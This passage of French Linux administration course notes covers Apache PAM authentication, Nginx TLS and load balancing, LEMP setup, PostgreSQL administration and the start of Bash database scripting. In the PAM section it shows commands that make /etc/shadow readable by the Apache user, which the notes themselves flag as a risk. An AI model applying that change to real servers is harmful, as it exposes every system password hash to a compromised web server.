                                  │
                                  └─ system-auth (config standard)
```

### mod_authnz_pam vs htpasswd

| Critère | **htpasswd** | **PAM** |
|---------|-------------|---------|
| Stockage | Fichier séparé | Comptes Linux système |
| Gestion | Manuelle (`htpasswd` cmd) | Centralisée (useradd, passwd) |
| Synchronisation | Aucune | Auto (même user SSH + Web) |
| Sécurité | Hash isolé | Accès `/etc/shadow` requis ⚠️ |

### Configuration Apache PAM

**1. Installation module**
```bash
sudo yum install mod_authnz_pam -y
```

**2. Activation module**
```apache
# /etc/httpd/conf.modules.d/55-authnz_pam.conf
LoadModule authnz_pam_module modules/mod_authnz_pam.so
```

**3. Configuration Directory**
```apache
# /etc/httpd/conf.d/protected.conf
<Directory "/var/www/html/protected">
    AuthType Basic
    AuthName "Restricted Area"
    AuthBasicProvider PAM              # ← Clé : utilise PAM
    AuthPAMService httpd               # ← Fichier /etc/pam.d/httpd
    Require valid-user
</Directory>
```

**4. Service PAM**
```
# /etc/pam.d/httpd
auth    include system-auth    # Délègue authentification
account include system-auth    # Délègue autorisation
```

**Explication `system-auth`** :
- Configuration PAM standard Linux
- Gère password hashing (SHA-512), lockout, aging
- Même stack que SSH, login console

### Problème permissions /etc/shadow

**Challenge** : Apache doit lire `/etc/shadow` pour valider passwords
```bash
ls -l /etc/shadow
# -rw------- 1 root root  (inaccessible par apache)
```

**Solutions** :

**Option 1 : Groupe shadow (utilisée KodeKloud)**
```bash
sudo groupadd -f shadow
sudo usermod -aG shadow apache
sudo chgrp shadow /etc/shadow
sudo chmod g+r /etc/shadow
# Résultat : -rw-r----- 1 root shadow
```

**⚠️ Risque sécurité** : Apache compromis = accès tous hashes passwords

**Option 2 : pwauth wrapper (production recommandée)**
```bash
sudo yum install pwauth -y
# Démon SUID root qui valide passwords
# Apache communique via IPC, jamais accès direct /etc/shadow
```

**Option 3 : pam_unix_auth.so**
```
# /etc/pam.d/httpd
auth sufficient pam_unix_auth.so    # Module shadow-aware
```

### Use cases PAM

**✅ Utiliser PAM si :**
- Gestion centralisée utilisateurs (LDAP, AD)
- Synchronisation accès SSH + Web
- Policies password complexes (PAM modules)
- Audit trails systématiques

**❌ Préférer htpasswd si :**
- Web isolé du système
- Users spécifiques application uniquement
- Pas besoin intégration infrastructure

### Test validation

```bash
# Succès
curl -u linuxuser:password localhost:8080/protected/
# HTTP/1.1 200 OK

# Échec user inexistant
curl -u fakeuser:password localhost:8080/protected/
# HTTP/1.1 401 Unauthorized

# Échec mauvais password
curl -u linuxuser:wrongpass localhost:8080/protected/
# HTTP/1.1 401 Unauthorized
```

### Debugging PAM

**Logs Apache** :
```bash
sudo tail -f /var/log/httpd/error_log
# [pam] authentication failure; user=john
```

**Test PAM hors Apache** :
```bash
pamtester httpd john authenticate
# pamtester: successfully authenticated
```

**Audit PAM** :
```bash
sudo ausearch -m USER_AUTH -sv no    # Échecs authentification
```

### Bonnes pratiques

1. **Production : Éviter shadow group**
   - Utiliser `pwauth` ou modules PAM dédiés
   - Principe moindre privilège

2. **Monitoring**
   - Alertes échecs authentification répétés
   - Rate limiting (fail2ban + PAM)

3. **Alternatives modernes**
   - OAuth2 / OIDC pour apps web
   - Client certificates SSL
   - SAML pour SSO enterprise

4. **Documentation**
   - Tracer utilisateurs ayant accès web
   - Policies rotation passwords

---

## Module 22 : Nginx SSL/TLS Configuration

### SSL/TLS - Concepts fondamentaux

**TLS (Transport Layer Security)** = Protocole chiffrement données HTTP → HTTPS
- Successeur SSL (Secure Sockets Layer) - nom parfois interchangeable
- Port standard : **443** (vs 80 pour HTTP)

**Composants certificat** :
- **Certificat (.crt)** : Clé publique + métadonnées (domaine, validité, émetteur)
- **Clé privée (.key)** : Clé privée secrète (jamais exposer)
- **CA Certificate** : Autorité certification (Let's Encrypt, DigiCert, etc.)

### Types certificats

| Type | Usage | Validation | Coût |
|------|-------|-----------|------|
| **Auto-signé** | Dev/Test/Intranet | Aucune (Warning navigateur) | Gratuit |
| **DV (Domain Validated)** | Sites publics | Propriété domaine | Gratuit (Let's Encrypt) |
| **OV (Organization)** | Business | Identité organisation | €€ |
| **EV (Extended)** | E-commerce/Banking | Validation juridique poussée | €€€€ |

### Configuration Nginx HTTPS

**Structure fichiers** :
```
/etc/nginx/
├── nginx.conf              # Config globale
├── conf.d/
│   └── secure.conf         # Virtual host HTTPS
└── ssl/
    ├── server.crt          # Certificat (permissions 644)
    └── server.key          # Clé privée (permissions 600 ⚠️)
```

**Configuration minimale HTTPS** :
```nginx
server {
    listen 443 ssl;                              # Port HTTPS + activation SSL
    listen [::]:443 ssl;                         # IPv6
    
    server_name example.com www.example.com;
    
    ssl_certificate /etc/nginx/ssl/server.crt;   # Certificat public
    ssl_certificate_key /etc/nginx/ssl/server.key; # Clé privée
    
    location / {
        root /var/www/html;
        index index.html;
    }
}
```

### Redirection HTTP → HTTPS

**Méthode 1 : Bloc server dédié (recommandée)**
```nginx
server {
    listen 80;
    listen [::]:80;
    server_name example.com;
    
    return 301 https://$server_name$request_uri;  # 301 = Permanent Redirect
}
```

**Codes HTTP redirection** :
- **301** : Permanent Redirect (SEO : moteurs indexent HTTPS)
- **302** : Temporary Redirect (tests, maintenance programmée)

**Variables Nginx** :
- `$server_name` : Nom serveur configuré (`example.com`)
- `$request_uri` : URI complète avec query string (`/page?id=123`)
- `$scheme` : Protocole (`http` ou `https`)

**Méthode 2 : if dans bloc (déconseillée)**
```nginx
# ❌ Éviter : performances, edge cases
if ($scheme != "https") {
    return 301 https://$server_name$request_uri;
}
```

### Sécurité SSL/TLS avancée

**Configuration hardened (production)** :
```nginx
# Protocoles modernes uniquement
ssl_protocols TLSv1.2 TLSv1.3;

# Cipher suites sécurisées
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
ssl_prefer_server_ciphers on;

# HSTS (HTTP Strict Transport Security)
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

# OCSP Stapling (validation certificat optimisée)
ssl_stapling on;
ssl_stapling_verify on;
ssl_trusted_certificate /etc/nginx/ssl/ca-chain.crt;

# Session cache (performances)
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 10m;
```

**HSTS Explained** :
- Navigateur force HTTPS pour domaine pendant `max-age` secondes
- Protège contre downgrade attacks (MitM HTTP)
- `includeSubDomains` : Applique à tous subdomains

### Certificats auto-signés (Dev/Test)

**Génération OpenSSL** :
```bash
# Générer clé privée 2048-bit RSA
openssl genrsa -out server.key 2048

# Générer certificat auto-signé valide 365 jours
openssl req -new -x509 -key server.key -out server.crt -days 365
# Remplir DN (Distinguished Name) : CN=hostname, O=Organization, etc.

# Alternative : Tout-en-un
openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout server.key -out server.crt -days 365 \
  -subj "/CN=stapp02.stratos.xfusioncorp.com"
```

**⚠️ Warning navigateur** :
- "Connexion non sécurisée" / "NET::ERR_CERT_AUTHORITY_INVALID"
- Certificat non signé par CA reconnue
- **Bypass** : Ajouter exception manuelle (dev uniquement)

### Let's Encrypt (Certificats gratuits production)

**Installation Certbot** :
```bash
sudo yum install certbot python3-certbot-nginx -y
```

**Obtention certificat automatique** :
```bash
sudo certbot --nginx -d example.com -d www.example.com
# 1. Valide propriété domaine (challenge HTTP-01)
# 2. Génère certificat DV
# 3. Configure Nginx automatiquement
# 4. Setup renouvellement auto (systemd timer)
```

**Renouvellement** :
```bash
sudo certbot renew --dry-run    # Test
sudo certbot renew              # Renouvelle si < 30 jours validité
```

### Test et validation SSL

**curl avec certificat auto-signé** :
```bash
# -k / --insecure : Ignore erreur certificat
curl -k https://localhost

# Afficher certificat
curl -vI https://example.com 2>&1 | grep -A 10 "SSL certificate"

# Test headers seulement
curl -Ik https://example.com
# -I : HEAD request (headers)
# -k : Insecure (ignore cert)
```

**OpenSSL test poignée de main** :
```bash
openssl s_client -connect example.com:443
# Affiche certificat, cipher suite, protocole TLS
```

**SSL Labs (analyse complète)** :
```
https://www.ssllabs.com/ssltest/analyze.html?d=example.com
# Score A+ à F
# Vulnérabilités (Heartbleed, POODLE, etc.)
# Compatibilité navigateurs
```

### Debugging Nginx SSL

**Erreurs communes** :

**1. Permission denied server.key**
```
nginx: [emerg] BIO_new_file("/etc/nginx/ssl/server.key") failed
```
**Solution** :
```bash
sudo chmod 600 /etc/nginx/ssl/server.key
sudo chown root:root /etc/nginx/ssl/server.key
```

**2. Certificat/clé mismatch**
```
nginx: [emerg] SSL_CTX_use_PrivateKey_file() failed (SSL: error:0B080074)
```
**Solution** : Vérifier correspondance clé/certificat
```bash
openssl x509 -noout -modulus -in server.crt | openssl md5
openssl rsa -noout -modulus -in server.key | openssl md5
# MD5 doivent correspondre
```

**3. Port 443 déjà utilisé**
```bash
sudo ss -tlnp | grep :443
# Identifier processus conflictuel
sudo systemctl stop other-service
```

### Permissions fichiers SSL

```bash
# Clé privée : Lecture root uniquement
chmod 600 /etc/nginx/ssl/server.key
chown root:root /etc/nginx/ssl/server.key

# Certificat public : Lecture tous
chmod 644 /etc/nginx/ssl/server.crt

# Répertoire SSL
chmod 755 /etc/nginx/ssl/
```

**⚠️ Sécurité** : Clé privée compromise = attaquant peut déchiffrer trafic, se faire passer pour serveur

### Architecture Nginx multi-sites SSL

```nginx
# Site 1
server {
    listen 443 ssl;
    server_name site1.com;
    ssl_certificate /etc/nginx/ssl/site1.crt;
    ssl_certificate_key /etc/nginx/ssl/site1.key;
}

# Site 2
server {
    listen 443 ssl;
    server_name site2.com;
    ssl_certificate /etc/nginx/ssl/site2.crt;
    ssl_certificate_key /etc/nginx/ssl/site2.key;
}
```

**SNI (Server Name Indication)** :
- Extension TLS permettant multi-sites sur même IP:port
- Client envoie hostname dans handshake TLS
- Nginx sélectionne certificat approprié
- Support navigateurs modernes (IE7+ sur Vista)

### Bonnes pratiques production

1. **Certificats** :
   - DV minimum (Let's Encrypt gratuit)
   - Renouvellement automatique (cron/systemd timer)
   - Monitoring expiration (30 jours alertes)

2. **Configuration** :
   - TLS 1.2+ uniquement (désactiver TLS 1.0/1.1)
   - Cipher suites modernes (forward secrecy)
   - HSTS actif (après validation config)

3. **Sécurité** :
   - Clés privées backup chiffré offline
   - Rotation clés annuelle recommandée
   - Audit SSL Labs trimestriel

4. **Performances** :
   - Session cache activé
   - OCSP stapling (réduit latence)
   - HTTP/2 enabled (multiplexing)

5. **Monitoring** :
   - Logs SSL errors (`/var/log/nginx/error.log`)
   - Trafic HTTP résiduel (vérifier redirections)
   - Metrics handshake time

---

## Module 23 : Nginx Load Balancing

### Concept Load Balancer (Répartiteur de charge)

**Load Balancer (LBR)** = Serveur distribuant requêtes entrantes sur plusieurs serveurs backend
- Point d'entrée unique pour clients
- Distribution charge équitable
- Haute disponibilité (failover automatique)
- Amélioration performances (scalabilité horizontale)

### Configuration Nginx Load Balancer

**Directive upstream** :
```nginx
upstream backend_pool {
    server backend1.example.com:8080;
    server backend2.example.com:8080;
    server backend3.example.com:8080;
}

server {
    listen 80;
    location / {
        proxy_pass http://backend_pool;
    }
}
```

**Explication** :
- `upstream` : Définit groupe serveurs backend
- `proxy_pass` : Redirige requêtes vers pool upstream
- Nginx agit comme **reverse proxy**

### Algorithmes de répartition

**1. Round-robin (défaut)** :
```nginx
upstream backend {
    server server1.example.com;
    server server2.example.com;
    server server3.example.com;
}
```
- Distribution **séquentielle** cyclique
- Équitable si backends identiques (CPU, RAM, charge)

**2. Least connections** :
```nginx
upstream backend {
    least_conn;
    server server1.example.com;
    server server2.example.com;
}
```
- Requête envoyée vers serveur ayant **le moins de connexions actives**
- Optimal si durée traitement variable

**3. IP Hash** :
```nginx
upstream backend {
    ip_hash;
    server server1.example.com;
    server server2.example.com;
}
```
- Client toujours dirigé vers **même serveur backend** (hash IP client)
- **Session persistence** (sticky sessions)
- Problème si backend down (clients réassignés)

**4. Weighted (pondéré)** :
```nginx
upstream backend {
    server server1.example.com weight=3;  # Reçoit 3x plus requêtes
    server server2.example.com weight=1;
}
```
- Distribution proportionnelle aux poids
- Utile si backends capacités différentes (serveur puissant = weight élevé)

### Health Checks et Failover

**Passive health check (défaut)** :
```nginx
upstream backend {
    server server1.example.com max_fails=3 fail_timeout=30s;
    server server2.example.com;
}
```

**Paramètres** :
- `max_fails=3` : Marque serveur down après 3 échecs
- `fail_timeout=30s` : Période avant nouvelle tentative
- Failover automatique vers serveurs UP

**Backup server** :
```nginx
upstream backend {
    server server1.example.com;
    server server2.example.com;
    server server3.example.com backup;  # Utilisé si primaires down
}
```

**Down server (maintenance)** :
```nginx
upstream backend {
    server server1.example.com;
    server server2.example.com down;  # Temporairement désactivé
}
```

### Reverse Proxy Headers

**Configuration headers** :
```nginx
location / {
    proxy_pass http://backend;
    
    # Forwarded headers
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}
```

**Explication headers** :
- `Host` : Nom domaine original (backends voient hostname client)
- `X-Real-IP` : IP réelle client (pas IP load balancer)
- `X-Forwarded-For` : Chaîne proxies traversés
- `X-Forwarded-Proto` : Protocole original (http/https)

**Importance** : Backends reçoivent infos client (logs, geo-location, security)

### Session Persistence (Sticky Sessions)

**Problème sans persistence** :
```
Client → LBR (round-robin)
Request 1 → Server A (session créée)
Request 2 → Server B (session inexistante = logout)
```

**Solution 1 : IP Hash**
```nginx
upstream backend {
    ip_hash;
    server server1.example.com;
    server server2.example.com;
}
```
- Limitation : Clients derrière NAT (même IP) → Même backend

**Solution 2 : Sticky Cookie (Nginx Plus - commercial)**
```nginx
upstream backend {
    server server1.example.com;
    server server2.example.com;
    sticky cookie srv_id expires=1h domain=.example.com path=/;
}
```

**Solution 3 : Centralized Sessions (recommandée)**
- Sessions stockées Redis/Memcached (pas sur backend local)
- Tous backends accèdent même store sessions
- Plus besoin sticky sessions

### Configuration complète production

```nginx
upstream app_backend {
    least_conn;  # Algorithme intelligent
    
    server app1.internal.local:8080 weight=2 max_fails=3 fail_timeout=30s;
    server app2.internal.local:8080 weight=2 max_fails=3 fail_timeout=30s;
    server app3.internal.local:8080 weight=1 max_fails=3 fail_timeout=30s;
    server app4.internal.local:8080 backup;
    
    keepalive 32;  # Connexions persistantes backend (performances)
}

server {
    listen 80;
    server_name example.com;
    
    # Redirect HTTP → HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name example.com;
    
    ssl_certificate /etc/nginx/ssl/example.crt;
    ssl_certificate_key /etc/nginx/ssl/example.key;
    
    # Security headers
    add_header Strict-Transport-Security "max-age=31536000" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    
    # Logs
    access_log /var/log/nginx/example.access.log;
    error_log /var/log/nginx/example.error.log;
    
    location / {
        proxy_pass http://app_backend;
        
        # Headers
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
        
        # Buffering
        proxy_buffering on;
        proxy_buffer_size 4k;
        proxy_buffers 8 4k;
    }
    
    # Static files (pas load balanced)
    location /static/ {
        alias /var/www/static/;
        expires 30d;
        add_header Cache-Control "public, immutable";
    }
    
    # Health check endpoint
    location /health {
        access_log off;
        return 200 "healthy\n";
        add_header Content-Type text/plain;
    }
}
```

### Monitoring et Troubleshooting

**Vérifier upstream status** :
```nginx
# Nginx Plus (commercial)
location /status {
    stub_status;  # Nginx open source
}
```

**Logs analysis** :
```bash
# Compter requêtes par backend
tail -f /var/log/nginx/access.log | grep -o 'upstream: [^,]*'

# Identifier backends slow
awk '$NF > 1.0' /var/log/nginx/access.log  # Response time > 1s
```

**Test load balancing** :
```bash
# Envoyer requêtes multiples
for i in {1..10}; do
  curl -s http://load-balancer.example.com | grep "Server:"
done

# Vérifier distribution (round-robin = alternance)
```

**Debug upstream** :
```nginx
# Activer debug logs
error_log /var/log/nginx/error.log debug;
```

### Bonnes pratiques

✅ **Health checks** : `max_fails` + `fail_timeout` (failover automatique)  
✅ **Backup server** : Serveur secours si tous primaires down  
✅ **Keepalive connections** : Réutiliser connexions TCP vers backends (performances)  
✅ **Forwarded headers** : Backends reçoivent infos client réelles  
✅ **Timeouts appropriés** : `proxy_read_timeout` selon temps traitement backend  
✅ **Monitoring** : Logs, metrics (requêtes/backend, latence, erreurs)  
✅ **SSL termination** : LBR déchiffre SSL, backend HTTP (performances)  

❌ **Éviter single point of failure** : Load balancer unique = SPOF (utiliser HA setup : keepalived, HAProxy pair)  
❌ **Sessions locales sans sticky** : Logouts aléatoires (centraliser sessions)  
❌ **Backends hétérogènes sans weight** : Serveur faible surchargé  

---

## Module 24 : LEMP Stack (Linux, Nginx, MySQL, PHP)

### Architecture LEMP

**Stack components** :
- **L**inux : OS (CentOS, Ubuntu, Debian)
- **E**ngine-X (Nginx) : Serveur web + reverse proxy
- **M**ySQL/MariaDB : Base de données relationnelle
- **P**HP : Langage scripting côté serveur

**vs LAMP** : Apache remplacé par Nginx (performances, concurrence)

### PHP-FPM (FastCGI Process Manager)

**Concept** : Pool workers PHP séparés de Nginx
- Nginx = Serveur web statique (HTML, CSS, JS)
- PHP-FPM = Exécution code dynamique PHP
- Communication : Socket Unix ou TCP

**Architecture** :
```
Client → Nginx (port 80) → PHP-FPM (socket/port 9000) → MySQL (port 3306)
                ↓                      ↓
            Static files          Dynamic PHP
```

### Configuration Nginx + PHP-FPM

**Socket Unix (recommandé)** :
```nginx
server {
    listen 80;
    server_name example.com;
    root /var/www/html;
    index index.php index.html;
    
    location / {
        try_files $uri $uri/ =404;
    }
    
    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php-fpm/www.sock;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}
```

**Socket TCP** :
```nginx
location ~ \.php$ {
    fastcgi_pass 127.0.0.1:9000;
    # ... reste identique
}
```

**Différence Unix vs TCP** :
- **Unix socket** : Même machine, performances supérieures (pas overhead TCP)
- **TCP socket** : PHP-FPM sur machine distante (architectures distribuées)

### Directives Nginx PHP

**index** :
```nginx
index index.php index.html index.htm;
```
- Ordre priorité fichiers index
- `index.php` **avant** `index.html` pour apps PHP

**try_files** :
```nginx
try_files $uri $uri/ =404;
```
- Tente servir fichier statique
- Si inexistant, erreur 404 (pas PHP)

**location ~ \.php$** :
```nginx
location ~ \.php$ {
    # Traitement fichiers .php
}
```
- Regex `~` : Match case-sensitive
- `\.php$` : Fichiers terminant par `.php`

**fastcgi_param SCRIPT_FILENAME** :
```nginx
fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
```
- Chemin absolu fichier PHP à exécuter
- `$document_root` : Valeur directive `root`
- `$fastcgi_script_name` : Nom fichier (ex: `/index.php`)

### Configuration PHP-FPM

**Fichier config principal** : `/etc/php-fpm.conf` ou `/etc/php-fpm.d/www.conf`

```ini
[www]
user = nginx
group = nginx

listen = /var/run/php-fpm/www.sock
listen.owner = nginx
listen.group = nginx
listen.mode = 0660

pm = dynamic
pm.max_children = 50
pm.start_servers = 5
pm.min_spare_servers = 5
pm.max_spare_servers = 35
```

**Explication paramètres** :
- `user/group` : Utilisateur exécutant workers PHP (même que Nginx)
- `listen` : Socket communication (Unix ou TCP)
- `listen.mode` : Permissions socket (Nginx doit pouvoir lire/écrire)
- `pm` : Process Manager (dynamic, static, ondemand)
- `pm.max_children` : Nombre max workers simultanés

**Process Manager modes** :
- **dynamic** : Workers créés/tués selon charge (recommandé)
- **static** : Nombre fixe workers (contrôle ressources strict)
- **ondemand** : Workers créés à la demande, tués après inactivité (économie RAM)

### Troubleshooting LEMP

**Problème 1 : 502 Bad Gateway**
```
Symptôme : Nginx affiche "502 Bad Gateway"
Cause : Nginx ne peut communiquer avec PHP-FPM
```

**Solutions** :
```bash
# Vérifier PHP-FPM actif
sudo systemctl status php-fpm

# Vérifier socket existe
ls -l /var/run/php-fpm/www.sock
# Si inexistant → Problème config PHP-FPM

# Vérifier permissions socket
# Socket doit être accessible Nginx (user:group = nginx:nginx)

# Tester PHP-FPM
echo "<?php phpinfo(); ?>" | sudo tee /var/www/html/test.php
curl localhost/test.php
```

**Problème 2 : Fichiers PHP téléchargés au lieu d'exécutés**
```
Symptôme : Navigateur télécharge fichier .php
Cause : Nginx ne passe pas requête à PHP-FPM
```

**Solutions** :
```nginx
# Vérifier directive index contient index.php
index index.php index.html;

# Vérifier location ~ \.php$ présent
location ~ \.php$ {
    fastcgi_pass unix:/var/run/php-fpm/www.sock;
    # ...
}

# Vérifier socket path correct (extension .sock)
```

**Problème 3 : Erreur "File not found"**
```
Symptôme : PHP-FPM logs "Primary script unknown"
Cause : SCRIPT_FILENAME incorrect
```

**Solution** :
```nginx
# Vérifier SCRIPT_FILENAME
fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;

# Vérifier document root correct
root /var/www/html;
```

**Problème 4 : Mauvais port Nginx**
```
Symptôme : Site inaccessible
Cause : Nginx écoute mauvais port
```

**Solution** :
```nginx
# Vérifier directive listen
listen 80;  # Pas 8080, 8084, etc.

# Vérifier port écoute
sudo ss -tlnp | grep nginx
# LISTEN :80
```

### Erreurs communes configuration

❌ **Socket path sans extension .sock** :
```nginx
# ERREUR
fastcgi_pass unix:/var/opt/remi/php74/run/php-fpm/www;

# CORRECT
fastcgi_pass unix:/var/opt/remi/php74/run/php-fpm/www.sock;
```

❌ **Document root incorrect** :
```nginx
# ERREUR
root /var/www/html-data/;  # Répertoire inexistant

# CORRECT
root /var/www/html/;
```

❌ **index.php manquant directive index** :
```nginx
# ERREUR
index index.html index.htm;

# CORRECT
index index.php index.html index.htm;
```

❌ **Permissions socket** :
```bash
# PHP-FPM socket
ls -l /var/run/php-fpm/www.sock
# srw-rw---- 1 nginx nginx  # OK

# srw------- 1 root root    # ERREUR (Nginx pas accès)
```

### Bonnes pratiques LEMP

✅ **Même user Nginx + PHP-FPM** : `user = nginx` (éviter permission denied)  
✅ **Socket Unix local** : Performances supérieures TCP  
✅ **Permissions socket restrictives** : 0660 (owner + group seulement)  
✅ **Process Manager dynamic** : Adaptation charge automatique  
✅ **Logs séparés** : Nginx access/error + PHP-FPM slow-log  
✅ **Security headers** : `X-Frame-Options`, `X-Content-Type-Options`  
✅ **Disable PHP execution uploads** : Empêcher webshells  

---

## Module 25 : PostgreSQL Administration

### Concepts PostgreSQL

**PostgreSQL** = SGBD relationnel open-source (objet-relationnel)
- Standards SQL (ACID compliance)
- Extensibilité (types custom, fonctions, langages)
- Performance (indexes, partitioning, replication)

**vs MySQL/MariaDB** :
- PostgreSQL : Conformité SQL stricte, features avancées (JSON, full-text search, GIS)
- MySQL : Simplicité, popularité, écosystème mature

### Architecture PostgreSQL

**Utilisateur système postgres** :
- Créé automatiquement installation PostgreSQL
- Superuser database (équivalent root)
- Utilisé administration initiale

**Roles vs Users** :
- PostgreSQL : Pas distinction (role = user ou groupe)
- `CREATE ROLE` = `CREATE USER` (user = role LOGIN)

### Création utilisateurs

**Méthode 1 : CLI createuser** :
```bash
sudo -u postgres createuser username
sudo -u postgres createuser username --pwprompt  # Demande password
sudo -u postgres createuser username --superuser # Avec privilèges admin
```

**Méthode 2 : SQL CREATE ROLE** :
```bash
sudo -u postgres psql -c "CREATE ROLE username LOGIN PASSWORD 'password';"
```

**Différence** :
- `createuser` : Wrapper CLI (plus simple)
- `CREATE ROLE` : SQL direct (plus contrôle options)

### Création databases

**Méthode 1 : CLI createdb** :
```bash
sudo -u postgres createdb dbname
sudo -u postgres createdb dbname --owner=username
```

**Méthode 2 : SQL CREATE DATABASE** :
```bash
sudo -u postgres psql -c "CREATE DATABASE dbname OWNER username;"
```

### Gestion passwords

**Définir password** :
```sql
ALTER USER username WITH ENCRYPTED PASSWORD 'password123';
```

**Password encryption** :
- Ancien : MD5 hash (faible)
- Moderne : SCRAM-SHA-256 (recommandé PostgreSQL 10+)

**Configuration encryption** :
```bash
# /var/lib/pgsql/data/postgresql.conf
password_encryption = scram-sha-256
```

### Permissions (GRANT/REVOKE)

**Niveaux permissions** :
1. **Database** : CONNECT, CREATE, TEMPORARY
2. **Schema** : CREATE, USAGE
3. **Table** : SELECT, INSERT, UPDATE, DELETE, TRUNCATE, REFERENCES, TRIGGER
4. **Column** : SELECT, INSERT, UPDATE, REFERENCES
5. **Sequence** : SELECT, UPDATE, USAGE
6. **Function** : EXECUTE

**Accorder permissions database** :
```sql
GRANT ALL PRIVILEGES ON DATABASE dbname TO username;
```

**ALL PRIVILEGES database** : CONNECT, CREATE, TEMPORARY

**Accorder permissions tables** :
```sql
-- Toutes tables schema public
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO username;

-- Tables futures (default privileges)
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL ON TABLES TO username;
```

**Accorder permissions spécifiques** :
```sql
GRANT SELECT, INSERT ON TABLE employees TO username;
GRANT EXECUTE ON FUNCTION calculate_salary TO username;
```

**Révoquer permissions** :
```sql
REVOKE INSERT ON TABLE employees FROM username;
```

### psql - Client CLI

**Connexion** :
```bash
# En tant qu'utilisateur système
sudo -u postgres psql

# Connexion database spécifique
sudo -u postgres psql -d dbname

# Connexion utilisateur spécifique
psql -U username -d dbname -h localhost
```

**Meta-commands** :
```sql
\l                  -- Lister databases
\du                 -- Lister users/roles
\dt                 -- Lister tables
\d tablename        -- Décrire structure table
\dn                 -- Lister schemas
\df                 -- Lister functions
\dv                 -- Lister views

\c dbname           -- Connect à database
\q                  -- Quitter

\i script.sql       -- Exécuter script SQL
\o output.txt       -- Rediriger output vers fichier

\timing on          -- Afficher temps exécution requêtes
\x                  -- Toggle expanded display (vertical)
```

**Exécuter SQL depuis CLI** :
```bash
# -c : Execute command
sudo -u postgres psql -c "SELECT version();"

# -f : Execute file
sudo -u postgres psql -f /path/to/script.sql

# Pipe
echo "SELECT NOW();" | sudo -u postgres psql
```

### Configuration PostgreSQL

**Fichiers config** :
- `/var/lib/pgsql/data/postgresql.conf` : Config principale
- `/var/lib/pgsql/data/pg_hba.conf` : Host-Based Authentication (accès)

**pg_hba.conf (contrôle accès)** :
```
# TYPE  DATABASE    USER        ADDRESS         METHOD
local   all         postgres                    peer
host    all         all         127.0.0.1/32    scram-sha-256
host    mydb        myuser      192.168.1.0/24  md5
```

**Explication** :
- **TYPE** : `local` (Unix socket), `host` (TCP/IP)
- **METHOD** : `peer` (user système), `md5`/`scram-sha-256` (password), `trust` (pas auth)

**Reload config** :
```bash
sudo systemctl reload postgresql
# ou
sudo -u postgres psql -c "SELECT pg_reload_conf();"
```

### Backup et Restore

**pg_dump (backup database)** :
```bash
# Backup database
sudo -u postgres pg_dump dbname > backup.sql

# Backup avec compression
sudo -u postgres pg_dump dbname | gzip > backup.sql.gz

# Backup format custom (compression + restauration sélective)
sudo -u postgres pg_dump -Fc dbname > backup.dump
```

**pg_dumpall (backup cluster complet)** :
```bash
# Toutes databases + roles + tablespaces
sudo -u postgres pg_dumpall > cluster_backup.sql
```

**Restore** :
```bash
# Restore SQL dump
sudo -u postgres psql dbname < backup.sql

# Restore custom format
sudo -u postgres pg_restore -d dbname backup.dump

# Restore avec création database
sudo -u postgres psql -c "CREATE DATABASE dbname;"
sudo -u postgres psql dbname < backup.sql
```

### Bonnes pratiques PostgreSQL

✅ **Ne jamais supprimer user postgres** : Superuser système critique  
✅ **Passwords forts** : SCRAM-SHA-256, pas MD5  
✅ **Principe moindre privilège** : Accorder uniquement permissions nécessaires  
✅ **Default privileges** : `ALTER DEFAULT PRIVILEGES` pour tables futures  
✅ **Backups réguliers** : `pg_dump` quotidien, PITR (Point-In-Time Recovery)  
✅ **Monitoring** : Logs, slow queries (`log_min_duration_statement`)  
✅ **pg_hba.conf restrictif** : Limiter accès réseau (127.0.0.1, VPN)  

❌ **Trust method production** : Pas authentication = risque sécurité  
❌ **User postgres accès externe** : Limiter local seulement  
❌ **Redémarrer service sans raison** : Downtime (reload suffit config changes)  

---

## Module 26 : Bash Scripting Avancé - Database Automation

### Conditionals Bash

**if/then/else** :
```bash
if [[ condition ]]; then
    # Code si true
elif [[ autre_condition ]]; then
    # Code si autre_condition true
else
    # Code si tout false
fi
```

**Test expressions** :
```bash
[[ -z "$var" ]]        # String vide
[[ -n "$var" ]]        # String non-vide
[[ "$a" == "$b" ]]     # Égalité strings
[[ "$a" != "$b" ]]     # Inégalité strings

[[ -f file ]]          # Fichier existe (régulier)
[[ -d dir ]]           # Répertoire existe
[[ -x file ]]          # Fichier exécutable

[[ $num -eq 5 ]]       # Égalité numérique
[[ $num -ne 5 ]]       # Inégalité
[[ $num -gt 5 ]]       # Greater than
[[ $num -lt 5 ]]       # Less than
```

### Command Substitution

**Capture output commande** :
```bash
result=$(commande)
result=`commande`      # Syntaxe ancienne (éviter)

# Exemple
current_date=$(date +%Y-%m-%d)
file_count=$(ls -1 | wc -l)
```

**Test output commande** :
```bash
if [[ -z $(ls /tmp/*.log 2>/dev/null) ]]; then
    echo "Aucun fichier log"
fi
```

### MySQL CLI en scripts

**Options mysql** :
```bash
mysql -u user -p'password' -e "SQL query"

# Options utiles
-s, --silent          # Pas de box formatting (output brut)
-N, --skip-column-names  # Pas headers colonnes
-e, --execute         # Execute SQL puis quitte
-D, --database        # Database par défaut
-h, --host            # Hostname
-P, --port            # Port
```

**Exemple script** :
```bash
#!/bin/bash

DB_USER="root"
DB_PASS="password"
DB_NAME="mydb"

# Test database existe
